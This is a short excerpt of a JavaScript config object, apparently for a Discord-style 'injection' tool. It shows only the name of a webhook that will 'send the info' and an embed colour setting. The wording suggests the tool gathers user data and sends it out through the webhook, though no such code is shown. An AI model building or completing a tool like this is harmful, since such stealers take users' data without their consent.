...
const config = {
  ...
  embed_name: 'Self jection', //name of the webhook thats gonna send the info
  ...
  embed_color: 0, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
